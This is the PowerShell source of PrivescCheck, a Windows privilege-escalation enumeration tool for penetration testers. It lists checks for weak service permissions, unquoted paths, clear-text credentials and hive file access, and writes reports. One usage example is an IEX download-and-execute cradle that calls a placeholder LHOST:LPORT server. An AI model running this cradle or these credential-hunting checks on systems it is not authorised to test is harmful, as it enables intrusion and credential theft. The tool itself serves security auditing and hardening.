function Invoke-PrivescCheck {
    <#
    .SYNOPSIS
    Enumerates common security misconfigurations that can be exploited for privilege escalation purposes.

    Author: @itm4n
    License: BSD 3-Clause

    .DESCRIPTION
    This script aims to identify security misconfigurations that are relevant for privilege escalation. It also provides some additional information that may help penetration testers to choose between several potential exploits. For example, if you find that a service is vulnerable to DLL hijacking but you can't restart it manually, you will find useful to know how often the machine is rebooted (in the case of a server). If you see that it is rebooted every night for instance, you may want to attempt an exploit.

    .PARAMETER Extended
    Set this flag to enable extended checks.

    .PARAMETER Experimental
    Set this flag to enable experimental checks.

    .PARAMETER Force
    Ignore warnings.

    .PARAMETER Silent
    Don't output test results, show only the final vulnerability report.

    .PARAMETER Report
    The base name of the output file report(s) (extension is appended automatically depending on the chosen file format(s)).

    .PARAMETER Format
    A comma-separated list of file formats (TXT,HTML,CSV,XML).

    .EXAMPLE
    PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck

    .EXAMPLE
    C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

    .EXAMPLE
    C:\Temp\>powershell "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/PrivescCheck.ps1'); Invoke-PrivescCheck"
    #>

    [CmdletBinding()] param(
        [switch] $Extended = $false,
        [switch] $Experimental = $false,
        [switch] $Force = $false,
        [switch] $Silent = $false,
        [string] $Report,
        [ValidateSet("TXT","HTML","CSV","XML")]
        [string[]] $Format
    )

    # Check wether the current process has admin privileges.
    # The following check was taken from Pow*rUp.ps1
    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
    if ($IsAdmin) {
        if (-not $Force) {
            Write-Warning "You are running this script as an administrator! Some checks will be automatically disabled."
            Write-Warning "You can specify the '-Force' option to disable this warning message."
            Start-Sleep -Seconds 10
        }
    }

    # The following CSV data contains all the checks
    $AllChecksCsv = @"
"Id",                             "Command",                                    "Category",                      "DisplayName",                         "Severity", "Format", "Extended", "RunIfAdmin", "Experimental", "Description"
"USER_USER",                      "Invoke-UserCheck",                           "TA0043 - Reconnaissance",       "User identity",                       "Info",     "List",   "False",    "True",       "False",        "Get information about the current user (name, domain name) and its access token (SID, integrity level, authentication ID)."
"USER_GROUPS",                    "Invoke-UserGroupsCheck",                     "TA0043 - Reconnaissance",       "User groups",                         "Info",     "Table",  "False",    "True",       "False",        "Get information about the groups the current user belongs to (name, type, SID)."
"USER_RESTRICTED_SIDS",           "Invoke-UserRestrictedSidsCheck",             "TA0043 - Reconnaissance",       "User restricted SIDs",                "Info",     "Table",  "True",     "True",       "False",        "Get information about potential restricted SIDs applied to the current user."
"USER_PRIVILEGES",                "Invoke-UserPrivilegesCheck",                 "TA0004 - Privilege Escalation", "User privileges",                     "High",     "List",   "False",    "False",      "False",        "Check whether the current user has privileges (e.g., SeImpersonatePrivilege) that can be leveraged for privilege escalation to SYSTEM."
"USER_ENV",                       "Invoke-UserEnvCheck",                        "TA0006 - Credential Access",    "User environment variables",          "Info",     "Table",  "False",    "True",       "False",        "Check whether any environment variables contain sensitive information such as credentials or secrets. Note that this check follows a keyword-based approach and thus might not be completely reliable."
"SERVICE_INSTALLED",              "Invoke-InstalledServicesCheck",              "TA0004 - Privilege Escalation", "Non-default services",                "Info",     "List",   "False",    "True",       "False",        "Get information about third-party services. It does so by parsing the target executable's metadata and checking whether the publisher is Microsoft."
"SERVICE_THIRD_PARTY",            "Invoke-ThirdPartyDriversCheck",              "TA0004 - Privilege Escalation", "Third-party Kernel drivers",          "Info",     "List",   "True",     "True",       "False",        "Get information about third-party kernel drivers. It does so by parsing the driver's metadata and checking whether the publisher is Microsoft."
"SERVICE_VULN_DRIVER",            "Invoke-VulnerableDriverCheck",               "TA0004 - Privilege Escalation", "Vulnerable Kernel drivers",           "High",     "List",   "False",    "True",       "False",        "Check whether known vulnerable kernel drivers are installed. It does so by computing the file hash of each driver and comparing the value against the list provided by loldrivers.io."
"SERVICE_PERMISSIONS",            "Invoke-ServicesPermissionsCheck",            "TA0004 - Privilege Escalation", "Service permissions",                 "High",     "List",   "False",    "False",      "False",        "Check whether the current user has any write permissions on a service through the Service Control Manager (SCM)."
"SERVICE_PERMISSIONS_REGISTRY",   "Invoke-ServicesPermissionsRegistryCheck",    "TA0004 - Privilege Escalation", "Service registry permissions",        "High",     "List",   "False",    "False",      "False",        "Check whether the current user has any write permissions on the configuration of a service in the registry."
"SERVICE_IMAGE_PERMISSIONS",      "Invoke-ServicesImagePermissionsCheck",       "TA0004 - Privilege Escalation", "Service binary permissions",          "High",     "List",   "False",    "False",      "False",        "Check whether the current user has any write permissions on a service's binary or its folder."
"SERVICE_UNQUOTED_PATH_INFO",     "Invoke-ServicesUnquotedPathCheck -Info",     "TA0004 - Privilege Escalation", "Service unquoted paths (info)",       "Info",     "List",   "True",     "False",      "False",        "Check whether there are services configured with an unquoted path that contains spaces."
"SERVICE_UNQUOTED_PATH",          "Invoke-ServicesUnquotedPathCheck",           "TA0004 - Privilege Escalation", "Service unquoted paths",              "High",     "List",   "False",    "False",      "False",        "Check whether there are services configured with an exploitable unquoted path that contains spaces."
"SERVICE_SCM_PERMISSIONS",        "Invoke-SCMPermissionsCheck",                 "TA0004 - Privilege Escalation", "Service Control Manager permissions", "High",     "List",   "False",    "False",      "False",        "Check whether the current user has any write permissions on the Service Control Manager (SCM)."
"APP_INSTALLED",                  "Invoke-InstalledProgramsCheck",              "TA0043 - Reconnaissance",       "Non-default applications",            "Info",     "Table",  "True",     "True",       "False",        "Get information about non-default and third-party applications by searching the registry and the default install locations."
"APP_MODIFIABLE",                 "Invoke-ModifiableProgramsCheck",             "TA0004 - Privilege Escalation", "Application permissions",             "Medium",   "List",   "True",     "False",      "False",        "Check whether the current user has any write permissions on non-default or third-party applications."
"APP_PROGRAMDATA",                "Invoke-ProgramDataCheck",                    "TA0004 - Privilege Escalation", "Non-default ProgramData folders",     "Info",     "List",   "True",     "False",      "True",         "Check whether the current user has any write permissions on a non-default "ProgramData" folder. This check is purely informative and the results require manual analysis."
"APP_STARTUP_INFO",               "Invoke-ApplicationsOnStartupCheck -Info",    "TA0004 - Privilege Escalation", "Startup applications (info)",         "Info",     "List",   "True",     "True",       "False",        "Get information about system-wide applications that are run at startup for all users."
"APP_STARTUP",                    "Invoke-ApplicationsOnStartupCheck",          "TA0004 - Privilege Escalation", "Startup application permissions",     "Medium",   "List",   "True",     "False",      "False",        "Check whether the current user has any write permissions on system-wide applications that are run at startup for all users."
"APP_PROCESSES",                  "Invoke-RunningProcessCheck",                 "TA0043 - Reconnaissance",       "Running processes",                   "Info",     "Table",  "True",     "True",       "False",        "Get information about the currently running processes that are not owned by the current user. Processes such as 'svchost.exe' are filtered out."
"SCHTASKS_IMAGE_PERMISSIONS",     "Invoke-ScheduledTasksImagePermissionsCheck", "TA0004 - Privilege Escalation", "Scheduled task binary permissions",   "Medium",   "List",   "True",     "False",      "False",        "Check whether the current user has any write permissions on a scheduled task's binary or its folder. Note that low-privileged users cannot list all the scheduled tasks."
"SCHTASKS_UNQUOTED_PATH",         "Invoke-ScheduledTasksUnquotedPathCheck",     "TA0004 - Privilege Escalation", "Scheduled task unquoted paths",       "Medium",   "List",   "True",     "False",      "True",         "Check whether there are scheduled tasks configured with an exploitable unquoted path. Note that low-privileged users cannot list all the scheduled tasks."
"CREDS_SENSITIVE_HIVE_FILES",     "Invoke-SensitiveHiveFileAccessCheck",        "TA0006 - Credential Access",    "Hive file permissions",               "Medium",   "List",   "False",    "False",      "False",        "Check whether the current user has read permissions on the SAM/SYSTEM/SECURITY files in the system folder (CVE-2021-36934 - HiveNightmare)."
"CREDS_SENSITIVE_HIVE_FILES_VSS", "Invoke-SensitiveHiveShadowCopyCheck",        "TA0006 - Credential Access",    "Hive file shadow copy permissions",   "High",     "List",   "False",    "False",      "False",        "Check whether the current user has read permissions on the SAM/SYSTEM/SECURITY files stored in volume shadow copies (CVE-2021-36934 - HiveNightmare)."
"CREDS_UNATTEND",                 "Invoke-UnattendFilesCheck",                  "TA0006 - Credential Access",    "Unattend file credentials",           "Medium",   "List",   "False",    "True",       "False",        "Check whether there are any 'unattend' files and whether they contain clear-text credentials."
"CREDS_WINLOGON",                 "Invoke-WinlogonCheck",                       "TA0006 - Credential Access",    "WinLogon credentials",                "Medium",   "List",   "False",    "True",       "False",        "Check whether the 'WinLogon' registry key contains clear-text credentials. Note that entries with an empty password field are filtered out."
"CREDS_CRED_FILES",               "Invoke-CredentialFilesCheck",                "TA0006 - Credential Access",    "Credential files",                    "Info",     "List",   "True",     "False",      "False",        "Get information about the current user's CREDENTIAL files."
"CREDS_VAULT_CRED",               "Invoke-VaultCredCheck",                      "TA0006 - Credential Access",    "Vault credentials (creds)",           "Info",     "List",   "True",     "True",       "False",        "Check whether the current user's credential vault contains any clear-text Windows passwords."
"CREDS_VAULT_LIST",               "Invoke-VaultListCheck",                      "TA0006 - Credential Access",    "Vault credentials (list)",            "Info",     "List",   "True",     "True",       "False",        "Check whether the current user's credential vault contains any clear-text web passwords."
"CREDS_GPP",                      "Invoke-GPPPasswordCheck",                    "TA0006 - Credential Access",    "GPP passwords",                       "Medium",   "List",   "False",    "True",       "False",        "Check whether there are cached Group Policy Preference (GPP) files that contain clear-text passwords."
"CREDS_PS_HIST",                  "Invoke-PowerShellHistoryCheck",              "TA0006 - Credential Access",    "PowerShell history",                  "Info",     "List",   "True",     "True",       "False",        "Check whether the current user's PowerShell history contains any clear-text credentials. Note that this check follows a keyword-based approach and thus might not be completely reliable."
"HARDEN_UAC",                     "Invoke-UacCheck",                            "TA0008 - Lateral Movement",     "UAC settings",                        "Low",      "List",   "False",    "True",       "False",        "Check whether User Access Control (UAC) is enabled and whether it filters the access token of local administrator accounts when they authenticate remotely."
"HARDEN_LSA_PROTECTION",          "Invoke-LsaProtectionCheck",                  "TA0006 - Credential Access",    "LSA Protection",                      "Low",      "List",   "False",    "True",       "False",        "Check whether LSA protection is enabled. Note that when LSA protection is enabled, 'lsass.exe' runs as a Protected Process Light (PPL) and thus can only be accessed by other protected processes with an equivalent or higher protection level."
"HARDEN_CREDENTIAL_GUARD",        "Invoke-CredentialGuardCheck",                "TA0006 - Credential Access",    "Credential Guard",                    "Low",      "List",   "False",    "True",       "False",        "Check whether Credential Guard is supported and enabled. Note that when Credential Guard is enabled, credentials are stored in an isolated process ('LsaIso.exe') that cannot be accessed, even if the kernel is compromised."
"HARDEN_BIOS_MODE",               "Invoke-BiosModeCheck",                       "TA0003 - Persistence",          "UEFI & Secure Boot",                  "Low",      "Table",  "False",    "True",       "False",        "Check whether UEFI and Secure Boot are supported and enabled. Note that Secure Boot requires UEFI."
"HARDEN_LAPS",                    "Invoke-LapsCheck",                           "TA0008 - Lateral Movement",     "LAPS",                                "Medium",   "List",   "False",    "True",       "False",        "Check whether LAPS is configured and enabled. Note that this applies to domain-joined machines only."
"HARDEN_PS_TRANSCRIPT",           "Invoke-PowershellTranscriptionCheck",        "TA0005 - Defense Evasion",      "PowerShell transcription",            "Info",     "List",   "True",     "True",       "False",        "Check whether PowerShell Transcription is configured and enabled."
"HARDEN_BITLOCKER",               "Invoke-BitLockerCheck",                      "TA0001 - Initial Access",       "BitLocker configuration",             "Medium",   "List",   "False",    "True",       "False",        "Check whether BitLocker is enabled on the system drive and requires a second factor of authentication (PIN or startup key). Note that this check might yield a false positive if a third-party drive encryption software is installed."
"CONFIG_PATH_FOLDERS",            "Invoke-DllHijackingCheck",                   "TA0004 - Privilege Escalation", "PATH folder permissions",             "High",     "List",   "False",    "False",      "False",        "Check whether the current user has any write permissions on the system-wide PATH folders. If so, the system could be vulnerable to privilege escalation through ghost DLL hijacking."
"MISC_HIJACKABLE_DLL",            "Invoke-HijackableDllsCheck",                 "TA0004 - Privilege Escalation", "Known ghost DLLs",                    "Info",     "List",   "False",    "False",      "False",        "Get information about services that are known to be prone to ghost DLL hijacking. Note that their exploitation requires the current user to have write permissions on at least one system-wide PATH folder."
"CONFIG_MSI",                     "Invoke-RegistryAlwaysInstallElevatedCheck",  "TA0004 - Privilege Escalation", "AlwaysInstallElevated",               "High",     "List",   "False",    "False",      "False",        "Check whether the 'AlwaysInstallElevated' policy is enabled system-wide and for the current user. If so, the current user may install a Windows Installer package with elevated (SYSTEM) privileges."
"CONFIG_WSUS",                    "Invoke-WsusConfigCheck",                     "TA0008 - Lateral Movement",     "WSUS configuration",                  "High",     "List",   "False",    "True",       "False",        "Check whether WSUS uses the HTTPS protocol to retrieve updates from the on-premise update server. If WSUS uses the clear-text HTTP protocol, it is vulnerable to MitM attacks that may result in remote code execution as SYSTEM."
"CONFIG_HARDENED_UNC_PATHS",      "Invoke-HardenedUNCPathCheck",                "TA0008 - Lateral Movement",     "Hardened UNC paths",                  "Medium",   "List",   "False",    "True",       "False",        "Check whether sensitive UNC paths are properly hardened. Note that non-hardened UNC paths used for retrieving group policies can be hijacked through an MitM attack to obtain remote code execution as SYSTEM."
"CONFIG_SCCM_INFO",               "Invoke-SccmCacheFolderCheck -Info",          "TA0006 - Credential Access",    "SCCM cache folder",                   "Info",     "List",   "False",    "True",       "False",        "Check whether the SCCM cache folder exists. Manual investigation may require administrative privileges."
"CONFIG_SCCM",                    "Invoke-SccmCacheFolderCheck",                "TA0006 - Credential Access",    "SCCM cache folder permissions",       "Medium",   "List",   "False",    "False",      "False",        "Check whether the current user has read permissions on the SCCM cache folder. If so, it might be possible to extract hardcoded credentials from MSI package files or scripts."
"CONFIG_PRINTNIGHTMARE",          "Invoke-PointAndPrintConfigCheck",            "TA0004 - Privilege Escalation", "Point and Print configuration",       "High",     "List",   "False",    "True",       "False",        "Check whether the Print Spooler service is enabled and if the Point and Print configuration allows non-administrator users to install printer drivers."
"CONFIG_COINSTALLERS",            "Invoke-DriverCoInstallersCheck",             "TA0004 - Privilege Escalation", "Driver co-installers",                "Low",      "List",   "False",    "True",       "False",        "Check whether Driver Co-installers are disabled. A local user might be able to gain SYSTEM privileges by plugging in a device such as a mouse or keyboard with a vulnerable Driver Co-installer."
"NET_ADAPTERS",                   "Invoke-NetworkAdaptersCheck",                "TA0043 - Reconnaissance",       "Network interfaces",                  "Info",     "List",   "True",     "True",       "False",        "Get information about all active Ethernet adapters."
"NET_TCP_ENDPOINTS",              "Invoke-TcpEndpointsCheck",                   "TA0004 - Privilege Escalation", "TCP endpoint servers",                "Info",     "Table",  "True",     "False",      "False",        "Get information about all the TCP ports that are in a LISTEN state. Note that the associated process is also listed."
"NET_UDP_ENDPOINTS",              "Invoke-UdpEndpointsCheck",                   "TA0004 - Privilege Escalation", "UDP endpoint servers",                "Info",     "Table",  "True",     "True",       "False",        "Get information about all the UDP ports that are in a LISTEN state. Note that the associated process is also listed. DNS is filtered out to minimize the output."
"NET_WLAN",                       "Invoke-WlanProfilesCheck",                   "TA0001 - Initial Access",       "Wi-Fi profiles",                      "Low",      "List",   "True",     "True",       "False",        "Get information about saved Wi-Fi profiles. Clear-text pre-shared keys (PSK) are displayed when possible, and potentially vulnerable 802.1x profiles are listed."
"NET_AIRSTRIKE",                  "Invoke-AirstrikeAttackCheck",                "TA0001 - Initial Access",       "Network selection from lock screen",  "Low",      "List",   "False",    "True",       "False",        "Check whether the 'Do not display network selection UI' policy is enabled on workstations (CVE-2021-28316 - Airstrike attack)."
"UPDATE_HISTORY",                 "Invoke-WindowsUpdateCheck",                  "TA0004 - Privilege Escalation", "Last Windows Update date",            "Info",     "Table",  "True",     "True",       "False",        "Get information about the latest Windows update. Note that this check might be unreliable."
"UPDATE_HOTFIX_INFO",             "Invoke-HotFixCheck -Info",                   "TA0004 - Privilege Escalation", "Windows Update history",              "Info",     "Table",  "True",     "True",       "False",        "Get information about the installed security updates through the registry. If this fails, the check will fall back to using the built-in 'Get-HotFix' cmdlet."
"UPDATE_HOTFIX",                  "Invoke-HotFixCheck",                         "TA0004 - Privilege Escalation", "Latest updates installed",            "Medium",   "Table",  "False",    "True",       "False",        "Check whether a Windows security update was installed within the last 31 days."
"MISC_AVEDR",                     "Invoke-EndpointProtectionCheck",             "TA0005 - Defense Evasion",      "Endpoint protection software",        "Info",     "Table",  "True",     "True",       "False",        "Get information about the installed security products (AV, EDR). Note that this check follows a keyword-based approach and thus might not be completely reliable."
"MISC_DEFENDER_EXCLUSIONS",       "Invoke-DefenderExclusionsCheck",             "TA0005 - Defense Evasion",      "Windows Defender exclusions",         "Info",     "Table",  "True",     "True",       "False",        "Get information about the exclusions configured in Microsoft Defender."
"MISC_SYSINFO",                   "Invoke-SystemInfoCheck",                     "TA0043 - Reconnaissance",       "Windows version",                     "Info",     "Table",  "True",     "True",       "False",        "Get information about the Windows version. Note that this information might be useful if the update history cannot be obtained."
"MISC_ADMINS",                    "Invoke-LocalAdminGroupCheck",                "TA0043 - Reconnaissance",       "Local administrators group",          "Info",     "Table",  "True",     "True",       "False",        "Get information about the users and groups in the local 'Administrators' group."
"MISC_USER_SESSION_LIST",         "Invoke-UserSessionListCheck",                "TA0004 - Privilege Escalation", "User sessions",                       "Info",     "Table",  "False",    "True",       "False",        "Get information about the currently logged-on users. Note that it might be possible to capture or relay the NTLM/Kerberos authentication of these users (RemotePotato0, KrbRelay)."
"MISC_HOMES",                     "Invoke-UsersHomeFolderCheck",                "TA0043 - Reconnaissance",       "User home folders",                   "Info",     "Table",  "True",     "False",      "False",        "Get information about the local home folders and check whether the current user has read or write permissions."
"MISC_MACHINE_ROLE",              "Invoke-MachineRoleCheck",                    "TA0043 - Reconnaissance",       "Machine role",                        "Info",     "Table",  "True",     "True",       "False",        "Get information about the machine's role. Is it a Workstation, a Server, or a Domain Controller."
"MISC_STARTUP_EVENTS",            "Invoke-SystemStartupHistoryCheck",           "TA0004 - Privilege Escalation", "System startup history",              "Info",     "Table",  "True",     "True",       "False",        "Get information about the startup history. Note that this information might be useful if the exploitation of a service requires a reboot but the current user does not have the privileges to shut down the system."
"MISC_STARTUP_LAST",              "Invoke-SystemStartupCheck",                  "TA0004 - Privilege Escalation", "Last system startup time",            "Info",     "Table",  "True",     "True",       "False",        "Get information about the last startup date and time based on the machine's tick count. Note that the result might not be completely reliable."
"MISC_DRIVES",                    "Invoke-SystemDrivesCheck",                   "TA0043 - Reconnaissance",       "Filesystem drives",                   "Info",     "Table",  "True",     "True",       "False",        "Get information about the partitions, removable storages, and mapped network shares."
"MISC_NAMED_PIPES",               "Invoke-NamedPipePermissionsCheck",           "TA0004 - Privilege Escalation", "Named pipe permissions",              "Info",     "List",   "True",     "False",      "True",         "Check whether the current user has any write permissions on other users' named pipes."
"MISC_LEAKED_HANDLES",            "Invoke-ExploitableLeakedHandlesCheck",       "TA0004 - Privilege Escalation", "Exploitable leaked handles",          "Info",     "List",   "True",     "False",      "True",         "Check whether the current user has access to a process that contains a leaked handle to a privileged object such as a process, thread or file."
"@

    # Reset all global ArrayLists on startup
    $global:CachedServiceList.Clear()
    $global:CachedHotFixList.Clear()
    $global:CachedScheduledTaskList.Clear()
    $global:ResultArrayList.Clear()

    $AllChecks = New-Object System.Collections.ArrayList

    # Load default checks
    $AllChecksCsv | ConvertFrom-Csv | ForEach-Object {
        [void] $AllChecks.Add($_)
    }

    $CheckCounter = 0
    foreach ($Check in $AllChecks) {

        $CheckCounter += 1
        $RunIfAdminCheck = [System.Convert]::ToBoolean($Check.RunIfAdmin)
        $ExtendedCheck = [System.Convert]::ToBoolean($Check.Extended)
        $ExperimentalCheck = [System.Convert]::ToBoolean($Check.Experimental)

        # If the current user is an admin but the check's RunIfAdmin flag was not set to true, ignore it.
        if ($IsAdmin -and (-not $RunIfAdminCheck)) { continue }

        # If it's an extended check but the Extended switch was not set to true, ignore it.
        if ($ExtendedCheck -and (-not $Extended)) { continue }

        # If it's an experimental check but the Experimental switch was not set to true, ignore it.
        if ($ExperimentalCheck -and (-not $Experimental)) { continue }

        if (-not $Silent) {
            Write-CheckBanner -Check $Check
        }

        # Run the check and store its output in a temp variable.
        $CheckResult = Invoke-Check -Check $Check

        if (-not $Silent) {
            # If the 'Silent' option was not specified, print a banner that shows some information about the
            # current check. Then, run the check and print the output either as a table or a list, depending on
            # the 'Format' value in the CSV data.
            Write-CheckResult -CheckResult $CheckResult
        }
        else {
            # If the 'Silent' option was specified, don't print the output of the check but write a progress bar
            # and show the name of the check which is being run. Note: if we are not running in a console window
            # Write-Progress will fail, so use Write-Output to print the completion percentage instead.
            $Completion = [UInt32](($CheckCounter * 100) / ($AllChecks.Count))

            if (Test-IsRunningInConsole) {
                Write-Progress -Activity "$($Check.Category.ToUpper()) > $($Check.DisplayName)" -Status "Progress: $($Completion)%" -PercentComplete $Completion
            }
            else {
                Write-Output "[$($Completion)%] $($Check.Category.ToUpper()) > $($Check.DisplayName)"
            }
        }
    }

    # Print a report on the terminal as an 'ASCII-art' table with colors using 'Write-Host'. Therefore,
    # this will be only visible if run from a 'real' terminal.
    # Show-PrivescCheckAsciiReport
    Write-ShortReport

    # If the 'Report' option was specified, write a report to a file using the value of this parameter
    # as the basename (or path + basename). The extension is then determined based on the chosen
    # format(s).
    if ($Report) {

        if (-not $Format) {
            # If a format or a format list was not specified, default to the TXT format.
            [string[]] $Format = "TXT"
        }

        $Format | ForEach-Object {
            # For each format, build the name of the output report file as BASENAME + . + EXT. Then generate the
            # report corresponding to the current format and write it to a file using the previously formatted
            # filename.
            $ReportFileName = "$($Report.Trim()).$($_.ToLower())"
            switch ($_) {
                "TXT"   { Write-TxtReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
                "HTML"  { Write-HtmlReport -AllResults $ResultArrayList | Out-File $ReportFileName }
                "CSV"   { Write-CsvReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
                "XML"   { Write-XmlReport  -AllResults $ResultArrayList | Out-File $ReportFileName }
                default { Write-Warning "`nReport format not implemented: $($Format.ToUpper())`n" }
            }
        }
    }

    # If the 'Extended' mode was not specified, print a warning message, unless the 'Force' parameter
    # was specified.
    if ((-not $Extended) -and (-not $Force) -and (-not $Silent)) {
        Write-Warning "To get more info, run this script with the option '-Extended'."
    }
}

function Invoke-Check {

    [CmdletBinding()] param(
        [object] $Check
    )

    $Result = Invoke-Expression -Command "$($Check.Command)"
    $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRaw" -Value $Result

    if ($Check.Format -eq "Table") {
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-Table | Out-String)
    }
    elseif ($Check.Format -eq "List") {
        $Check | Add-Member -MemberType "NoteProperty" -Name "ResultRawString" -Value $($Result | Format-List | Out-String)
    }

    $IsInfoCheck = $Check.Severity -eq "Info"

    if ($IsInfoCheck) {
        $Check.Severity = "None"
    }
    else {
        $Check.Severity = $(if ($null -eq $Result) { "None" } else { $Check.Severity } )
    }

    [void] $ResultArrayList.Add($Check)
    $Check
}

function Write-CheckBanner {

    [OutputType([string])]
    [CmdletBinding()] param(
        [object] $Check,
        [switch] $Ascii
    )
    
    function Split-Description {
        param([string]$Description)

        $DescriptionSplit = New-Object System.Collections.ArrayList
        $TempOld = ""
        $TempNew = ""
        $Description.Split(' ') | ForEach-Object {

            $TempNew = "$($TempOld) $($_)".Trim()
            if ($TempNew.Length -gt 60) {
                [void]$DescriptionSplit.Add($TempOld)
                $TempOld = "$($_)"
            }
            else {
                $TempOld = $TempNew
            }
        }
        if ($TempOld) {
            [void]$DescriptionSplit.Add($TempOld)
        }
        $DescriptionSplit
    }

    $HeavyVertical =          [char] $(if ($Ascii) { '|' } else { 0x2503 })
    $HeavyHorizontal =        [char] $(if ($Ascii) { '-' } else { 0x2501 })
    $HeavyVerticalAndRight =  [char] $(if ($Ascii) { '+' } else { 0x2523 })
    $HeavyVerticalAndLeft =   [char] $(if ($Ascii) { '+' } else { 0x252B })
    $HeavyDownAndHorizontal = [char] $(if ($Ascii) { '+' } else { 0x2533 })
    $HeavyUpAndHorizontal =   [char] $(if ($Ascii) { '+' } else { 0x253B })
    $HeavyDownAndLeft =       [char] $(if ($Ascii) { '+' } else { 0x2513 })
    $HeavyDownAndRight =      [char] $(if ($Ascii) { '+' } else { 0x250F })
    $HeavyUpAndRight =        [char] $(if ($Ascii) { '+' } else { 0x2517 })
    $HeavyUpAndLeft =         [char] $(if ($Ascii) { '+' } else { 0x251B })

    $Result = ""
    $Result += "$($HeavyDownAndRight)$("$HeavyHorizontal" * 10)$($HeavyDownAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyDownAndLeft)`n"
    $Result += "$($HeavyVertical) CATEGORY $($HeavyVertical) $($Check.Category)$(' ' * (49 - $Check.Category.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVertical) NAME     $($HeavyVertical) $($Check.DisplayName)$(' ' * (49 - $Check.DisplayName.Length)) $($HeavyVertical)`n"
    $Result += "$($HeavyVerticalAndRight)$("$HeavyHorizontal" * 10)$($HeavyUpAndHorizontal)$("$HeavyHorizontal" * 51)$($HeavyVerticalAndLeft)`n"
    Split-Description -Description $Check.Description | ForEach-Object {
        $Result += "$($HeavyVertical) $($_)$(' '*(60 - ([String]$_).Length)) $($HeavyVertical)`n"
    }
    $Result += "$($HeavyUpAndRight)$("$HeavyHorizontal" * 62)$($HeavyUpAndLeft)"
    $Result
}

function Write-CheckResult {

    [OutputType([string])]
    [CmdletBinding()] param(
        [object] $CheckResult
    )

    $FindingCount = $(if ($CheckResult.ResultRaw) { ([Object[]]$CheckResult.ResultRaw).Length } else { 0 })

    $ResultOutput = "[*] Result: "
    if (($CheckResult.Severity -eq "None") -and ($FindingCount -eq 0)) {
        $ResultOutput += "Nothing found"
    }
    else {
        $ResultOutput += "$(if ($CheckResult.Severity -eq "None") { "Informational " } else { "Vulnerable - $($CheckResult.Severity) " })"
        $ResultOutput += "($($FindingCount) finding$(if ($FindingCount -gt 1) { "s" }))"
    }

    $ResultOutput += "`n"

    if ($FindingCount -gt 0) {
        switch ($CheckResult.Format) {
            "Table"     { $ResultOutput += $CheckResult.ResultRaw | Format-Table -AutoSize | Out-String }
            "List"      { $ResultOutput += $CheckResult.ResultRaw | Format-List | Out-String }
            default     { Write-Warning "Unknown format: $($CheckResult.Format)" }
        }
    }

    $ResultOutput
}

function Write-TxtReport {

    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $AllResults | ForEach-Object {
        Write-CheckBanner -Check $_ -Ascii
        Write-CheckResult -CheckResult $_
    }
}

function Write-CsvReport {

    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $AllResults | Sort-Object -Property "Category" | Select-Object -Property "Category","DisplayName","Description","Severity","ResultRawString" | ConvertTo-Csv -NoTypeInformation
}

function Write-XmlReport {
    <#
    .NOTES
    According to the XML specification, some characters are invalid. The raw result of a check ("ResultRawString") may contain such characters. Therefore, this result must be sanitized before calling "ConvertTo-Xml". The method used here was taken from a solution that was posted on StackOverflow.

    .LINK
    https://github.com/itm4n/PrivescCheck/issues/24
    https://stackoverflow.com/questions/45706565/how-to-remove-special-bad-characters-from-xml-using-powershell
    #>

    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $AuthorizedXmlCharactersRegex = "[^\x09\x0A\x0D\x20-\xD7FF\xE000-\xFFFD\x10000\x10FFFF]"
    $AllResults | ForEach-Object {
        $_.ResultRawString = [System.Text.RegularExpressions.Regex]::Replace($_.ResultRawString, $AuthorizedXmlCharactersRegex, "")
        $_
    } | Sort-Object -Property "Category" | Select-Object Id,Category,DisplayName,Description,Severity,ResultRawString | ConvertTo-Xml -As String
}

function Write-HtmlReport {

    [OutputType([string])]
    [CmdletBinding()] param(
        [object[]] $AllResults
    )

    $JavaScript = @"
var cells = document.getElementsByTagName('td');

for (var i=0; i<cells.length; i++) {
    var bg_color = null;
    if (cells[i].innerHTML == "Low") {
        bg_color = "bg_blue";
    } else if (cells[i].innerHTML == "Medium") {
        bg_color = "bg_orange";
    } else if (cells[i].innerHTML == "High") {
        bg_color = "bg_red";
    } else if (cells[i].innerHTML == "None") {
        bg_color = "bg_grey";
    }

    if (bg_color) {
        cells[i].innerHTML = "<span class=\"label " + bg_color + "\">" + cells[i].innerHTML + "</span>";
    }

    // If a cell is too large, we need to make it scrollable. But 'td' elements are not
    // scrollable so, we need make it a 'div' first and apply the 'scroll' (c.f. CSS) style to make
    // it scrollabale.
    if (cells[i].offsetHeight > 200) {
        cells[i].innerHTML = "<div class=\"scroll\">" + cells[i].innerHTML + "</div>";
        console.log("Cells height is greater than 200");
    }
}
"@

    $Css = @"
body {
    font: 1.2em normal Arial,sans-serif;
}

table {
    border-collapse: collapse;
    width: 100%;
    border: 2px solid grey;
}

th {
    color: white;
    background: grey;
    text-align: center;
    padding: 5px 0;
}

td {
    text-align: center;
    padding: 5px 5px 5px 5px;
    max-width: 800px;
}

tbody td:nth-child(3) {
    text-align: left;
}

/* Render output results with 'pre' style */
tbody td:nth-child(5) {
    white-space: pre;
    margin: 1em 0px;
    padding: .2rem .4rem;
    font-size: 87.5%;
    font-family: SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
    text-align: left;
}

tbody tr:nth-child(odd) {
    background: whitesmoke;
}

.scroll {
    max-height: 200px;
    max-width: 800px;
    overflow: auto;
}

.label {
    color: white;
    margin: 8px;
    padding: 6px;
    display: block;
    width: 60px;
    border-radius: 5px;
}

.bg_green { background-color: green; }
.bg_blue { background-color: royalblue; }
.bg_orange { background-color: orange; }
.bg_red { background-color: red; }
.bg_grey { background-color: grey; }
"@

    $Html = @"
<html lang="en-US">
<title>PrivescCheck Report</title>
<head>
<style>
$($Css)
</style>
</head>
<body>
BODY_TO_REPLACE
<script>
$($JavaScript)
</script>
</body>
</html>
